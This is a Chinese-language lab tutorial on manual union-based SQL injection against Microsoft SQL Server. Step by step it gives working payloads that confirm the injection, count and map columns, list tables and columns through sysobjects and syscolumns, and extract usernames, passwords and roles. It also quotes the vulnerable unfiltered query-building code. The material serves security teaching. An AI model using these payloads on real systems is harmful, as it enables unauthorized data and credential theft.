# 有回显的Mssql手工注入

[TOC]

## Mssql介绍

SQL Server数据库的一切信息都保存在它的系统表格里，每个数据库内都有系统表**sysobjects**，它存放该数据库内创建的所有对象，如**数据库，表，约束、默认值、日志、规则、存储过程**等，每个对象在表中占一行。



## 注入过程

1. **判断是否注入点**

   **id=1 and 1=1**页面返回正常，**id=1 and 1=2** 页面返回不正常，说明存在注入。

   造成注入的原因是未对传入的参数做任何的过滤，关键代码为：

   - `string where = string.Format("ID={0}", Request.Params["id"]);`
   - 拼接后的sql语句为`select * from articles where ID= Request.Params["id"]`

2. **判断字段数**

   在**id=1**后面添加**order by n**，n从1开始依次增大，直到页面返回不正常，当n=a时页面返回正常，n=a+1时页面返回不正常，说明字段数为a。这里依次尝试order by 1,2,3,4,5,6，发现当n为5的时候页面返回正常，n为6的时候页面没有正常返回，所以可以确定字段数为5。

   ![img](image\db7cf8d7-1c57-4170-b2e5-2f80e1001d82.jpg)

3. **用`union`判断回显字段**

   根据上一步已经知道字段数为5，因为mssql可以用**union联合查询**，所以用`id=1 and 1=2 union select 1,2,3,4,5`测试，

   因为用**union**是**有字段数和数据类型的限制**，请自行查阅，通过尝试发现当id=1 and 1=2 union select 1,'2','3','4',5页面有回显。

      ![img](image\7f280067-f60f-4460-80e9-94c95b3de522.jpg)
   根据上面的步骤可以知道表中的2，3，4字段为字符串类型。2，3，4中的内容可以用系统函数代替，获取想要的信息，比如：将'3'替换成

4. `db_name()`，获取数据库的名字为Ms_SqlInect。

      ![img](image\headImg.jpg)

5. **爆出所要数据库的表和内容**

   每个数据库中都有一个**sysobjects系统表**，通过这个表读取数据库的表。

   `id=1 and 1=2 union select 1,'2',name,'4',5 from sysobjects where xtype='u'`

      ![img](https://www.hetianlab.com/headImg.action?guideImg=71d8c5ab-102f-4ea7-8f76-45dfa1615633.jpg)

   获取第二个表的名字。通过构造SQL语句可以爆出第二个表的名字，得到用户表User。仔细观察SQL语句的书写技巧：

   `id=1 and 1=2 union select top 1 1,'2',name,'4',5 from sysobjects where xtype='u' and name not in (select top 1 name from sysobjects where xtype = 'u')`

      ![img](https://www.hetianlab.com/headImg.action?guideImg=27ccc861-6373-4dc1-af1b-b4b1a9f24a76.jpg)

   找到用户后，通过系统表`syscolumns`爆出字段的名字。语句为：`id=1 and 1=2 union select top 1 1,'2',name,'4',5 from syscolumns where id = (select id from sysobjects where name= 'user')`，获取第一个字段。

      ![img](https://www.hetianlab.com/headImg.action?guideImg=73c79925-30d8-4afc-b7fa-3faf335d2114.jpg)

   4、获取第二个字段。id=1 and 1=2 union select top 1 1,'2',name,'4',5 from syscolumns where id = (select id from sysobjects where name= 'user') and name not in(select top 1 name from syscolumns where id =(select id from sysobjects where name='user'))，依次可以找出该表中还有password和role字段。

      ![img](https://www.hetianlab.com/headImg.action?guideImg=ca72246f-a481-4ffb-848a-ff2d0d25b836.jpg)

   5、获取字段内容。

      从表user中获取name字段的内容。

      ![img](https://www.hetianlab.com/headImg.action?guideImg=ffc2a689-12a9-4667-bcea-9dc0b8534110.jpg)

      这里user添加一个[]是因为系统表中也存在user表，把name换成password和role就可以爆出相应字段的内容。